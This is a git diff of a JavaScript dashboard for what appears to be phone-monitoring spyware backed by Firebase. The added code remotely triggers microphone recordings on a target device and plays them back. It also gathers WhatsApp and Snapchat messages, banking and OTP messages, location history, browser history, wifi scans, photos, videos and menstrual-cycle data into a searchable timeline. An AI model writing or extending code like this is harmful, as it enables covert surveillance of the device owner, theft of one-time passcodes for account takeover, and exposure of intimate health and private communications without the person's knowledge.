   let html = `<div style="font-size:13px;color:var(--muted);margin-bottom:8px">${recIds.length} remote recording${recIds.length > 1 ? 's' : ''} • newest first</div>`;
   for (const recId of recIds) {
-    const meta = data[recId];
-    if (!meta || typeof meta !== 'object') continue;
-    const recData = meta;
+    let recData;
+    try { recData = await fetchRTDB(`devices/${deviceId}/recordings/${recId}`); } catch { continue; }
+    if (!recData || typeof recData !== 'object') continue;
+    // Support both root-level and meta/ sub-path metadata
+    if (!recData.durationSec && recData.meta && typeof recData.meta === 'object') {
+      recData = recData.meta;
+    }
     const recIdKey = recId;
     const createdAt = recData.createdAt ? new Date(recData.createdAt).toLocaleString() : '';
     const duration = recData.durationSec || 0;
@@ -1682,7 +2366,7 @@ async function pollRemoteRecordings() {
     let allPartsOk = true;
     for (let i = 0; i < segments; i++) {
       try {
-        const part = await fetchRTDB(`devices/${selectedDevice}/recordings/${recIdKey}/parts/${i}`);
+        const part = await fetchRTDB(`devices/${deviceId}/recordings/${recIdKey}/parts/${i}`);
         if (part && part.data) { parts.push(part.data); } else { allPartsOk = false; }
       } catch { allPartsOk = false; }
     }
@@ -1690,21 +2374,16 @@ async function pollRemoteRecordings() {
     let status = '';
     if (allPartsOk && parts.length === segments && segments > 0) {
       const durLabel = duration > 0 ? `${duration}s` : `${segments * 60}s`;
-      const segId = 'sr_' + recIdKey.replace(/[^a-zA-Z0-9]/g, '_');
-      const uris = parts.map(p => `data:${mt};base64,${p}`);
-      const bars = Array.from({length: segments}, (_, i) =>
-        `<div style="flex:1;background:var(--border);border-radius:2px;transition:background .2s" id="segBar_${segId}_${i}"></div>`
-      ).join('');
-      const urisJson = uris.map(u => u.replace(/"/g, '&quot;'));
-      player = `<div style="display:flex;flex-direction:column;gap:4px">
-        <div style="display:flex;align-items:center;gap:8px;font-size:13px">
-          <button onclick="segPlay('${segId}',${segments})" style="background:none;border:none;color:var(--accent);font-size:18px;cursor:pointer;padding:4px 8px;border-radius:6px" id="segBtn_${segId}">▶</button>
-          <span style="color:var(--muted)" id="segLabel_${segId}">1/${segments}</span>
-          <span style="color:var(--accent);font-size:12px" id="segTime_${segId}">0:00</span>
-        </div>
-        <audio id="segAudio_${segId}" style="width:100%" preload="none" data-uris="${urisJson.join('||')}" data-seg-idx="0" data-seg-id="${segId}" data-segments="${segments}"></audio>
-        <div style="display:flex;gap:2px;height:4px;margin:2px 0">${bars}</div>
-      </div>`;
+      if (segments === 1) {
+        player = `<audio controls preload="none" src="data:${mt};base64,${parts[0]}" type="${mt}"></audio>`;
+      } else {
+        const playlist = parts.map((b64, i) => {
+          const dataUri = `data:${mt};base64,${b64}`;
+          return `<div style="margin-top:6px;font-size:12px;color:var(--muted)">Part ${i + 1} of ${segments}</div>
+<audio controls preload="none" src="${dataUri}" type="${mt}" style="width:100%"></audio>`;
+        }).join('');
+        player = `<div style="max-height:240px;overflow-y:auto">${playlist}</div>`;
+      }
       status = `<span class="vmeta" style="color:var(--success);margin-left:8px">\u25CF Playable</span>`;
     } else if (segments > 0 && !allPartsOk) {
       status = `<span class="vmeta" style="color:var(--danger);margin-left:8px">\u26A0 Partially synced</span>`;
@@ -1712,12 +2391,128 @@ async function pollRemoteRecordings() {
       status = `<span class="vmeta" style="color:var(--muted);margin-left:8px">\u25CF No audio data</span>`;
     }
     html += `<div class="voice-card">
-      <div class="vname">&#x1F3A4; Recording ${recIdKey.substring(0, 8)}... ${status}</div>
+      <div class="vname">&#x1F3A4; Recording ${recIdKey.substring(0, 8)}... ${status}
+        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteRecording('${recIdKey}')">\u{1F5D1}</button>
+      </div>
       <div class="vmeta">Created: ${createdAt}  \u2022  Duration: ${duration}s  \u2022  Segments: ${segments}  \u2022  Size: ${sizeMb}MB  \u2022  Type: ${mt}</div>
       ${player}
     </div>`;
   }
   list.innerHTML = html;
+}
+
+// --- Remote Recording Commands ---
+async function startRemoteRecordingRemote() {
+  if (_remoteRecordingActive) { showAlert('Recording already in progress', 'warn'); return; }
+  const deviceId = recordingDevice || selectedDevice;
+  if (!deviceId) { showAlert('Select a device first', 'error'); return; }
+  const durSec = parseInt(document.getElementById('remote-recDuration').value, 10);
+  const requestId = crypto.randomUUID ? crypto.randomUUID() : 'req_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+  const path = `devices/${deviceId}/commands/audio_record`;
+  try {
+    await fetch(`${RTDB}/${path}.json`, {
+      method: 'PUT',
+      body: JSON.stringify({ action: 'start', durationSec: durSec, requestId })
+    });
+    _remoteRecordingActive = true;
+    document.getElementById('remote-recStatus').textContent = 'Recording started...';
+    document.getElementById('remote-recProgress').style.display = 'block';
+    document.getElementById('remote-btnStartRecord').style.display = 'none';
+    document.getElementById('remote-btnCancelRecord').style.display = 'inline-flex';
+    document.getElementById('remote-recProgressBar').value = 0;
+    document.getElementById('remote-recProgressLabel').textContent = '0 / ' + durSec + 's';
+    document.getElementById('remote-recProgressTime').textContent = '';
+    document.getElementById('remote-recProgressSegments').textContent = '';
+    document.getElementById('remote-recProgressFormat').textContent = '';
+    startRecordingProgressPolling(deviceId, durSec);
+  } catch (e) {
+    showAlert('Failed to send recording command: ' + e.message, 'error');
+  }
+}
+
+async function cancelRemoteRecordingRemote() {
+  const deviceId = recordingDevice || selectedDevice;
+  if (!deviceId) return;
+  const path = `devices/${deviceId}/commands/audio_record`;
+  try {
+    await fetch(`${RTDB}/${path}.json`, {
+      method: 'PUT',
+      body: JSON.stringify({ action: 'cancel' })
+    });
+    resetRemoteRecordingUI();
+    showAlert('Cancel command sent', 'warn');
+  } catch (e) {
+    showAlert('Failed to cancel: ' + e.message, 'error');
+  }
+}
+
+function resetRemoteRecordingUI() {
+  _remoteRecordingActive = false;
+  document.getElementById('remote-recStatus').textContent = '';
+  document.getElementById('remote-recProgress').style.display = 'none';
+  document.getElementById('remote-btnStartRecord').style.display = 'inline-flex';
+  document.getElementById('remote-btnCancelRecord').style.display = 'none';
+  if (window._recordingProgressTimer) {
+    clearInterval(window._recordingProgressTimer);
+    window._recordingProgressTimer = null;
+  }
+}
+
+function startRecordingProgressPolling(deviceId, durationSec) {
+  if (window._recordingProgressTimer) clearInterval(window._recordingProgressTimer);
+  const startTime = Date.now();
+  window._recordingProgressTimer = setInterval(async () => {
+    if (document.hidden) return;
+    if ((recordingDevice || selectedDevice) !== deviceId) { resetRemoteRecordingUI(); return; }
+    try {
+      const status = await fetchRTDB(`devices/${deviceId}/recordingStatus`);
+      if (status && status.status === 'recording') {
+        const elapsed = status.elapsedSec || 0;
+        const pct = durationSec > 0 ? Math.min(100, (elapsed / durationSec) * 100) : 0;
+        document.getElementById('remote-recProgressBar').value = pct;
+        document.getElementById('remote-recProgressLabel').textContent = elapsed + ' / ' + durationSec + 's';
+        document.getElementById('remote-recProgressTime').textContent = 'Elapsed: ' + elapsed + 's';
+        document.getElementById('remote-recProgressSegments').textContent = 'Segments: ' + (status.segmentsCompleted || 0);
+        document.getElementById('remote-recProgressFormat').textContent = 'Format: ' + (status.format || 'aac');
+      } else if (status && status.status === 'completed') {
+        resetRemoteRecordingUI();
+        pollRemoteRecordings();
+      } else if (!status) {
+        const elapsedSinceStart = Math.floor((Date.now() - startTime) / 1000);
+        if (elapsedSinceStart > durationSec + 5) {
+          resetRemoteRecordingUI();
+          pollRemoteRecordings();
+        }
+      }
+    } catch {}
+  }, 3000);
+}
+
+async function cleanupOldRecordings(days) {
+  if (!confirm(`Delete all remote recordings older than ${days} day(s)? This cannot be undone.`)) return;
+  const deviceId = recordingDevice || selectedDevice;
+  if (!deviceId) return;
+  const cutoff = Date.now() - days * 86400000;
+  const data = await fetchRTDB(`devices/${deviceId}/recordings`, 'shallow=true');
+  if (!data || typeof data !== 'object') return;
+  let deleted = 0;
+  for (const id of Object.keys(data)) {
+    const rec = await fetchRTDB(`devices/${deviceId}/recordings/${id}`);
+    if (!rec || typeof rec !== 'object') continue;
+    const meta = rec.durationSec ? rec : (rec.meta || rec);
+    if (meta && meta.createdAt && meta.createdAt < cutoff) {
+      const parts = await fetchRTDB(`devices/${deviceId}/recordings/${id}/parts`, 'shallow=true');
+      if (parts && typeof parts === 'object') {
+        for (const p of Object.keys(parts)) {
+          try { await fetch(`${RTDB}/devices/${deviceId}/recordings/${id}/parts/${p}.json`, { method: 'DELETE' }); } catch {}
+        }
+      }
+      try { await fetch(`${RTDB}/devices/${deviceId}/recordings/${id}.json`, { method: 'DELETE' }); } catch {}
+      deleted++;
+    }
+  }
+  showAlert(`Deleted ${deleted} recordings older than ${days} day(s)`, 'warn');
+  pollRemoteRecordings();
 }
 
 async function pollContacts() {
@@ -2307,6 +3102,25 @@ function jumpToPoint(idx) {
   highlightPointInList(idx);
 }
 
+function flyToLocation(lat, lng, label) {
+  if (!lat || !lng) return;
+  map.setView([lat, lng], 16, { animate: true, duration: 0.5 });
+  if (marker) {
+    marker.setLatLng([lat, lng]);
+    marker.setPopupContent(label || `${lat.toFixed(6)}, ${lng.toFixed(6)}`).openPopup();
+  }
+  const pts = locationHistory.length ? locationHistory : (timelineCache || []);
+  for (let i = 0; i < pts.length; i++) {
+    const p = pts[i];
+    if (p.lat === lat && p.lng === lng) { playbackIdx = i; break; }
+  }
+}
+
+async function loadMoreTimeline() {
+  timelineOffset += TIMELINE_BATCH;
+  if (timelineCache) renderTimeline(timelineCache);
+}
+
 // --- Timeline ---
 let timelineFilter = 'all';
 document.querySelectorAll('.chip[data-filter]').forEach(chip => {
@@ -2314,6 +3128,7 @@ document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
     chip.classList.add('active');
     timelineFilter = chip.dataset.filter;
+    timelineOffset = 0;
     if (timelineCache) renderTimeline(timelineCache);
     else pollHistory();
   });
@@ -2321,6 +3136,13 @@ document.querySelectorAll('.chip[data-filter]').forEach(chip => {
 
 function renderTimeline(docs) {
   const list = document.getElementById('timelineList');
+  try {
+  // Period filter
+  const now = Date.now() + 5 * 60 * 1000;
+  const periodMs = { '1h': 3600000, '6h': 21600000, '12h': 43200000, '24h': 86400000, '7d': 604800000, '30d': 2592000000, 'all': Infinity };
+  const cutoff = now - (periodMs[timelinePeriod] || periodMs['24h']);
+  docs = docs.filter(d => parseInt(d.ts_ms || '0') >= cutoff);
+  // Counts
   const counts = { all: docs.length };
   for (const d of docs) {
     const type = (d.type || '').toLowerCase();
@@ -2328,31 +3150,47 @@ function renderTimeline(docs) {
     if (type.includes('call')) counts.call = (counts.call || 0) + 1;
     if (type.includes('whatsapp') || type.includes('message')) counts.whatsapp = (counts.whatsapp || 0) + 1;
     if (type.includes('snapchat')) counts.snapchat = (counts.snapchat || 0) + 1;
+    if (type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction')) counts.banking = (counts.banking || 0) + 1;
   }
   document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     const f = chip.dataset.filter;
     chip.textContent = chip.dataset.label + (counts[f] !== undefined ? ' (' + counts[f] + ')' : '');
   });
-  const filtered = docs.filter(d => {
+  // Search filter
+  const tlSearch = (document.getElementById('timelineSearch')?.value || '').toLowerCase().trim();
+  if (tlSearch) docs = docs.filter(d => {
+    const searchText = ((d.type || '') + ' ' + (d.contactName || '') + ' ' + (d.contact || '') + ' ' + (d.messagePreview || '') + ' ' + (d.duration || '') + ' ' + (d.direction || '')).toLowerCase();
+    return searchText.includes(tlSearch);
+  });
+  // Type filter
+  let filtered = docs.filter(d => {
     const type = (d.type || '').toLowerCase();
     if (timelineFilter === 'all') return true;
     if (timelineFilter === 'location') return type === 'location';
     if (timelineFilter === 'call') return type.includes('call');
-    if (timelineFilter === 'whatsapp') return type.includes('whatsapp') || type.includes('message');
+    if (timelineFilter === 'whatsapp_individual') return (type.includes('whatsapp') || type.includes('message')) && !type.includes('group') && !type.includes('broadcast');
+    if (timelineFilter === 'whatsapp_group') return (type.includes('whatsapp') || type.includes('message')) && (type.includes('group') || type.includes('broadcast'));
     if (timelineFilter === 'snapchat') return type.includes('snapchat');
+    if (timelineFilter === 'banking') return type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction');
     return true;
-  }).slice(0, 200);
+  });
+  const totalFiltered = filtered.length;
+  filtered = filtered.slice(0, timelineOffset || TIMELINE_BATCH);
   if (!filtered.length) { list.innerHTML = '<div class="label">No entries</div>'; return; }
+  // Dedup
+  const dedupEnabled = document.getElementById('dedupToggle')?.checked;
+  const dedupInterval = dedupEnabled ? 10000 : 60000;
   const deduped = [];
   for (const d of filtered) {
     const last = deduped[deduped.length - 1];
     if (last && (d.type || '').includes(last.type || '') &&
         (d.contactName || d.contact || '') === (last.contactName || last.contact || '') &&
-        Math.abs(parseInt(d.ts_ms || '0') - parseInt(last.ts_ms || '0')) < 60000) {
+        Math.abs(parseInt(d.ts_ms || '0') - parseInt(last.ts_ms || '0')) < dedupInterval) {
       continue;
     }
     deduped.push(d);
   }
+  // Group by day
   const groups = {};
   for (const d of deduped) {
     const day = new Date(parseInt(d.ts_ms || '0')).toLocaleDateString('en-PK', { timeZone: PKT, day: '2-digit', month: 'short', weekday: 'short' });
@@ -2365,25 +3203,63 @@ function renderTimeline(docs) {
     const calls = entries.filter(e => (e.type || '').includes('call')).length;
     const msgs = entries.filter(e => (e.type || '').includes('whatsapp') || (e.type || '').includes('message')).length;
     const snaps = entries.filter(e => (e.type || '').includes('snapchat')).length;
-    const summary = [locs ? `${locs}📍` : '', calls ? `${calls}📞` : '', msgs ? `${msgs}💬` : '', snaps ? `${snaps}📸` : ''].filter(Boolean).join(' ');
+    const banks = entries.filter(e => (e.type || '').includes('banking') || (e.type || '').includes('financial') || (e.type || '').includes('otp') || (e.type || '').includes('payment') || (e.type || '').includes('transaction')).length;
+    const summary = [locs ? `${locs}\u{1F4CD}` : '', calls ? `${calls}\u{1F4DE}` : '', msgs ? `${msgs}\u{1F4AC}` : '', snaps ? `${snaps}\u{1F4F8}` : '', banks ? `${banks}\u{1F4B3}` : ''].filter(Boolean).join(' ');
     html += `<div class="tl-group"><div class="tl-day">${day}</div><div class="tl-summary">${summary}</div>`;
     for (const d of entries) {
       const type = d.type || '';
       const ts = parseInt(d.ts_ms || '0');
-      const icon = type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : '\u{1F4CD}';
+      const icon = type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction') ? '\u{1F4B3}' : '\u{1F4CD}';
       const contact = d.contactName || d.contact || '';
       const msg = d.messagePreview || '';
       const dur = d.duration || '';
       const dir = d.direction || '';
-      html += `<div class="card">
+      const lat = d.lat, lng = d.lng;
+      const isLoc = type === 'location' && lat && lng;
+      html += `<div class="card"${isLoc ? ` onclick="flyToLocation(${lat}, ${lng}, '${contact ? contact.replace(/'/g, "\\'") : pkt(ts)}')" style="cursor:pointer"` : ''}>
         <div class="time">${icon} ${pkt(ts)}</div>
-        <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}</div>
+        <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}${isLoc ? ' \u{1F4CD} click to fly' : ''}</div>
       </div>`;
     }
     html += '</div>';
   }
   list.innerHTML = html;
+  // Load More button
+  if (totalFiltered > (timelineOffset || TIMELINE_BATCH)) {
+    const remaining = totalFiltered - (timelineOffset || TIMELINE_BATCH);
+    list.innerHTML += `<button class="load-more-btn" onclick="loadMoreTimeline()">\u{2B07} Load more (${remaining} remaining)</button>`;
+  }
+  } catch(e) {
+    console.error('renderTimeline error:', e);
+    list.innerHTML = '<div class="label" style="color:var(--danger)">Timeline render error: ' + e.message + '. <button onclick="pollHistory()">Retry</button></div>';
+  }
 }
+
+// --- Timeline period/clear/dedup handlers ---
+document.getElementById('timelinePeriod')?.addEventListener('change', function() {
+  timelinePeriod = this.value;
+  timelineOffset = 0;
+  if (timelineCache) renderTimeline(timelineCache);
+});
+document.getElementById('dedupToggle')?.addEventListener('change', function() {
+  timelineOffset = 0;
+  if (timelineCache) renderTimeline(timelineCache);
+});
+async function clearTimeline() {
+  if (!selectedDevice || !confirm('Delete ALL timeline entries from Firebase RTDB?\nThis cannot be undone.')) return;
+  const ok = await deleteRTDB(`devices/${selectedDevice}/timeline`);
+  if (ok) { timelineCache = null; document.getElementById('timelineList').innerHTML = '<div class="label">No entries</div>'; showAlert('Timeline deleted', 'warn'); }
+  else showAlert('Failed to delete timeline', 'error');
+}
+// --- Timeline search ---
+let timelineSearchTimeout = null;
+document.getElementById('timelineSearch')?.addEventListener('input', function() {
+  clearTimeout(timelineSearchTimeout);
+  timelineSearchTimeout = setTimeout(() => {
+    timelineOffset = 0;
+    if (timelineCache) renderTimeline(timelineCache);
+  }, 300);
+});
 
 function renderCalls(docs) {
   const body = document.getElementById('callsBody');
@@ -2416,30 +3292,43 @@ document.querySelectorAll('.app-period-btn').forEach(btn => {
   });
 });
 
-// --- Copy coords ---
+// --- Keyboard shortcuts ---
 document.addEventListener('keydown', e => {
-  if (e.key === 'c' && e.ctrlKey) {
-    const text = document.getElementById('coordBox').textContent;
-    if (text !== '--' && navigator.clipboard) navigator.clipboard.writeText(text).catch(() => {});
+  // Ctrl+C for coords
+  if (e.key === 'c' && (e.ctrlKey || e.metaKey)) {
+    const text = document.getElementById('coordBox')?.textContent;
+    if (text && text !== '--' && navigator.clipboard) navigator.clipboard.writeText(text).catch(() => {});
   }
-});
-
-// --- Timeline Search ---
-document.getElementById('timelineSearch').addEventListener('input', function() {
-  const q = this.value.toLowerCase();
-  document.querySelectorAll('#timelineList .tl-group').forEach(g => {
-    const text = g.textContent.toLowerCase();
-    g.style.display = q === '' || text.includes(q) ? '' : 'none';
-  });
+  // Single-letter tab shortcuts (no modifier)
+  const letterMap = { h: 'health', p: 'photos', m: 'videos', v: 'voice', l: 'live', s: 'storage', t: 'timeline', a: 'apps', r: 'recents', g: 'geofence', w: 'wifi', b: 'browser', c: 'calls', o: 'contacts' };
+  if (!e.ctrlKey && !e.metaKey && !e.altKey && letterMap[e.key]) {
+    e.preventDefault();
+    switchTab(letterMap[e.key]);
+  }
+  // 1-9 for tab switching with Alt
+  const numMap = { '1': 'live', '2': 'timeline', '3': 'recents', '4': 'calls', '5': 'apps', '6': 'photos', '7': 'videos', '8': 'insights', '9': 'storage' };
+  if (e.key >= '1' && e.key <= '9' && e.altKey) {
+    e.preventDefault();
+    const tab = numMap[e.key];
+    if (tab) switchTab(tab);
+  }
+  // Escape to close video player
+  if (e.key === 'Escape') closeVideoPlayer();
+  // Ctrl+F for global search
+  if (e.key === 'f' && (e.ctrlKey || e.metaKey)) {
+    e.preventDefault();
+    document.getElementById('globalSearch')?.focus();
+  }
 });
 
 // --- Insights ---
 async function renderInsights() {
   if (!selectedDevice) return;
+  try {
   const [hist, apps, tl] = await Promise.all([
-    fetchRTDB(`devices/${selectedDevice}/location/history`, 'shallow=true'),
+    fetchRTDB(`devices/${selectedDevice}/location/history`),
     fetchRTDB(`devices/${selectedDevice}/apps`),
-    fetchRTDB(`devices/${selectedDevice}/timeline`)
+    fetchRTDB(`devices/${selectedDevice}/timeline`, 'orderBy="$key"&limitToLast=1000')
   ]);
   
   // Location changes per hour (last 24h)
@@ -2483,7 +3372,7 @@ async function renderInsights() {
   if (tl && typeof tl === 'object') {
     let callsToday = 0;
     Object.values(tl).forEach(entry => {
-      if (entry.type === 'call' || entry.type === 1 || entry.type === 2 || entry.type === 3) {
+      if (entry.type === 'call' || entry.type === 'incoming' || entry.type === 'outgoing' || entry.type === 'missed') {
         const num = entry.number || 'unknown';
         contactCount[num] = (contactCount[num] || 0) + 1;
         const ts = parseInt(entry.ts_ms);
@@ -2495,24 +3384,25 @@ async function renderInsights() {
   const sortedContacts = Object.entries(contactCount).sort((a, b) => b[1] - a[1]).slice(0, 10);
   const tcEl = document.getElementById('inTopContacts');
   if (tcEl) {
-    tcEl.innerHTML = sortedContacts.length 
-      ? sortedContacts.map(([num, count]) => 
+    tcEl.innerHTML = sortedContacts.length
+      ? sortedContacts.map(([num, count]) =>
           `<div style="display:flex;justify-content:space-between;padding:2px 0;font-size:14px">
             <span>${escHtml(num)}</span><span style="color:var(--accent)">${count}x</span>
           </div>`).join('')
       : '<span class="label">No call data available</span>';
   }
 
-  // Activity heatmap (hour of day)
+  // Heatmap overlay
   const heatEl = document.getElementById('inHeatmap');
   if (heatEl) {
     const maxH = Math.max(...locByHour, 1);
     heatEl.innerHTML = locByHour.map((v, h) => {
       const pct = (v / maxH * 100);
-      const intensity = pct > 75 ? '#ffca28' : pct > 50 ? '#f0b800' : pct > 25 ? '#c89600' : '#30363d';
+      const intensity = pct > 75 ? '#ef4444' : pct > 50 ? '#f97316' : pct > 25 ? '#eab308' : '#6b7280';
       return `<div title="${h}:00 - ${v}" style="width:24px;height:24px;background:${intensity};border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:9px;color:${pct > 50 ? '#000' : 'var(--text)'}">${h}</div>`;
     }).join('');
   }
+  } catch(e) { console.error('renderInsights error:', e); }
 }
 
 // --- Storage & Cleanup ---
@@ -2561,7 +3451,7 @@ async function refreshStorage() {
   el.innerHTML = '<div class="label">Scanning storage...</div>';
   const devicePath = `devices/${selectedDevice}`;
   try {
-    const [photos, voice, timeline, contacts, apps, location, browser, wifi] = await Promise.all([
+    const [photos, voice, timeline, contacts, apps, location, browser, wifi, videos] = await Promise.all([
       estimateNodeSize(`${devicePath}/photos`, 3),
       estimateNodeSize(`${devicePath}/voice_notes`, 2),
       estimateNodeSize(`${devicePath}/timeline`, 1),
@@ -2569,10 +3459,12 @@ async function refreshStorage() {
       estimateNodeSize(`${devicePath}/apps`, 1),
       estimateNodeSize(`${devicePath}/location`, 1),
       estimateNodeSize(`${devicePath}/browser_history`, 1),
-      estimateNodeSize(`${devicePath}/wifi_scan`, 1)
+      estimateNodeSize(`${devicePath}/wifi_scan`, 1),
+      estimateNodeSize(`${devicePath}/videos`, 2)
     ]);
     const categories = [
       { name: 'Photos', icon: '📸', path: 'photos', ...photos },
+      { name: 'Videos', icon: '🎬', path: 'videos', ...videos },
       { name: 'Voice Notes', icon: '🎤', path: 'voice_notes', ...voice },
       { name: 'Timeline', icon: '📞', path: 'timeline', ...timeline },
       { name: 'Contacts', icon: '👥', path: 'contacts', ...contacts },
@@ -2583,10 +3475,12 @@ async function refreshStorage() {
     ];
     let totalBytes = 0;
     let html = '<div style="font-size:15px;font-weight:500;margin-bottom:6px">📊 Storage Overview</div>';
-    html += '<table style="font-size:14px"><thead><tr><th>Category</th><th>Entries</th><th>Est. Size</th></tr></thead><tbody>';
+    html += '<table style="font-size:14px"><thead><tr><th>Category</th><th>Entries</th><th>Est. Size</th><th></th></tr></thead><tbody>';
+    const maxBytes = Math.max(...categories.map(c => c.bytes), 1);
     for (const cat of categories) {
       totalBytes += cat.bytes;
-      html += `<tr><td>${cat.icon} ${cat.name}</td><td>${cat.count === 0 ? '—' : cat.count}</td><td>${cat.count === 0 ? '—' : formatBytes(cat.bytes)}</td></tr>`;
+      const pct = maxBytes > 0 ? (cat.bytes / maxBytes) * 100 : 0;
+      html += `<tr><td>${cat.icon} ${cat.name}</td><td>${cat.count === 0 ? '—' : cat.count}</td><td>${cat.count === 0 ? '—' : formatBytes(cat.bytes)}</td><td>${cat.count > 0 ? `<div style="height:8px;background:var(--border);border-radius:4px;overflow:hidden;min-width:60px"><div style="height:100%;width:${Math.max(1, pct)}%;background:var(--accent);border-radius:4px"></div></div>` : '—'}</td></tr>`;
     }
     html += `<tr style="border-top:2px solid var(--accent);font-weight:600"><td>Total</td><td>${categories.reduce((s, c) => s + c.count, 0)}</td><td>${formatBytes(totalBytes)}</td></tr>`;
     html += '</tbody></table>';
@@ -2604,7 +3498,11 @@ function renderCleanupActions(categories) {
     { label: '🧹 Dedup Photos', desc: 'Remove duplicate photos (keep highest quality)', action: 'dedupPhotos', path: 'photos', icon: '📸' },
     { label: '🗑 Delete All Photos', desc: 'Remove all uploaded photos', action: 'deleteAll', path: 'photos', icon: '📸', dangerous: true },
     { label: '♻️ Clear Photo Dedup Cache', desc: 'Reset local dedup cache to re-scan all photos', action: 'clearPhotoCache', path: 'photos', icon: '📸' },
+    { label: '🧹 Dedup Timeline', desc: 'Remove duplicate timeline entries', action: 'dedupTimeline', path: 'timeline', icon: '📞' },
+    { label: '🧹 Dedup Haidh', desc: 'Remove duplicate menstrual cycle entries', action: 'dedupHaidh', path: 'health', icon: '🩸' },
+    { label: '🧹 Dedup Exercise', desc: 'Remove duplicate exercise entries', action: 'dedupExercise', path: 'health', icon: '💪' },
     { label: '👥 Dedup Contacts', desc: 'Merge duplicate contacts by phone number', action: 'dedupContacts', path: 'contacts', icon: '👥' },
+    { label: '🗑 Delete Videos', desc: 'Remove all synced videos', action: 'deleteAll', path: 'videos', icon: '🎬', dangerous: true },
     { label: '🗑 Delete Voice Notes', desc: 'Remove all voice recordings', action: 'deleteAll', path: 'voice_notes', icon: '🎤', dangerous: true },
     { label: '🔄 Clear Voice Audio Budget', desc: 'Reset 30-day audio budget to allow new voice uploads', action: 'clearVoiceBudget', path: 'voice_notes', icon: '🎤' },
     { label: '🗑 Delete Timeline', desc: 'Remove call logs & timeline events', action: 'deleteAll', path: 'timeline', icon: '📞', dangerous: true },
@@ -2852,6 +3750,58 @@ async function execCleanup(action, path) {
     }
     return;
   }
+  if (action === 'dedupTimeline') {
+    if (!confirm('Scan and deduplicate timeline entries (remove entries with same type + contact within 60s)?')) return;
+    showAlert('Scanning timeline entries...', 'warn');
+    const data = await fetchRTDB(`${base}/timeline`);
+    if (!data || typeof data !== 'object') { showAlert('No timeline data found', 'error'); return; }
+    const entries = Object.entries(data).map(([k, v]) => ({ key: k, ...v })).filter(e => e.type).sort((a, b) => (a.ts_ms || 0) - (b.ts_ms || 0));
+    const deduped = []; let deleted = 0;
+    for (const e of entries) {
+      const last = deduped[deduped.length - 1];
+      if (last && (e.type || '').includes(last.type || '') && (e.contactName || e.contact || '') === (last.contactName || last.contact || '') && Math.abs(parseInt(e.ts_ms || '0') - parseInt(last.ts_ms || '0')) < 60000) {
+        if (await deleteRTDB(`${base}/timeline/${e.key}`)) deleted++;
+        continue;
+      }
+      deduped.push(e);
+    }
+    await refreshStorage();
+    showAlert(`Cleaned ${deleted} duplicate timeline entries`, deleted > 0 ? 'warn' : 'error');
+    if (timelineCache) renderTimeline(timelineCache);
+    return;
+  }
+  if (action === 'dedupHaidh') {
+    if (!confirm('Scan and deduplicate menstrual cycle entries?')) return;
+    showAlert('Scanning haidh cycles...', 'warn');
+    const data = await fetchRTDB(`${base}/haidh/cycles`);
+    if (!data || typeof data !== 'object') { showAlert('No haidh data found', 'error'); return; }
+    const cycles = Object.entries(data).map(([k, v]) => ({ key: k, ...v })).filter(e => e.ts_ms).sort((a, b) => a.ts_ms - b.ts_ms);
+    const seen = new Set(); let deleted = 0;
+    for (const c of cycles) {
+      const sig = c.startDate || Math.floor(c.ts_ms / 60000);
+      if (seen.has(sig)) { if (await deleteRTDB(`${base}/haidh/cycles/${c.key}`)) deleted++; }
+      else seen.add(sig);
+    }
+    await refreshStorage();
+    showAlert(`Cleaned ${deleted} duplicate haidh entries`, deleted > 0 ? 'warn' : 'error');
+    return;
+  }
+  if (action === 'dedupExercise') {
+    if (!confirm('Scan and deduplicate exercise entries?')) return;
+    showAlert('Scanning exercise entries...', 'warn');
+    const data = await fetchRTDB(`${base}/exercise/daily`);
+    if (!data || typeof data !== 'object') { showAlert('No exercise data found', 'error'); return; }
+    const sessions = Object.entries(data).map(([k, v]) => ({ key: k, ...v })).filter(e => e.ts_ms).sort((a, b) => a.ts_ms - b.ts_ms);
+    const seen = new Set(); let deleted = 0;
+    for (const s of sessions) {
+      const sig = Math.floor(s.ts_ms / 60000);
+      if (seen.has(sig)) { if (await deleteRTDB(`${base}/exercise/daily/${s.key}`)) deleted++; }
+      else seen.add(sig);
+    }
+    await refreshStorage();
+    showAlert(`Cleaned ${deleted} duplicate exercise entries`, deleted > 0 ? 'warn' : 'error');
+    return;
+  }
 }
 
 // --- Browser History ---
@@ -2974,11 +3924,11 @@ async function exportData() {
       });
     }
   }
-  if (!csv) { showAlert('No data to export', 'warn'); return; }
-  const blob = new Blob([csv], { type: 'text/csv' });
+if (!csv) { showAlert('No data to export', 'warn'); return; }
+  const blob = new Blob([csv], { type: 'text/plain' });
   const url = URL.createObjectURL(blob);
   const a = document.createElement('a');
-  a.href = url; a.download = `kojos_${selectedDevice}_${new Date().toISOString().slice(0,10)}.csv`;
+  a.href = url; a.download = `kojos_${selectedDevice}_${new Date().toISOString().slice(0,10)}.txt`;
   a.click(); URL.revokeObjectURL(url);
   showAlert('Exported ' + (csv.match(/\n/g)||[]).length + ' rows', 'warn');
 }
@@ -3132,22 +4082,40 @@ async function pollWifiScans() {
 // --- Logcat ---
 let logcatCache = [];
 
+let logcatExpanded = new Set();
+
 async function pollLogcat() {
   if (!selectedDevice) return;
-  const data = await fetchRTDB(`devices/${selectedDevice}/logcat`);
-  if (!data || typeof data !== 'object') {
-    logcatCache = [];
-    return;
+  const [logcatData, anrData] = await Promise.all([
+    fetchRTDB(`devices/${selectedDevice}/logcat`),
+    fetchRTDB(`devices/${selectedDevice}/anr_logs`)
+  ]);
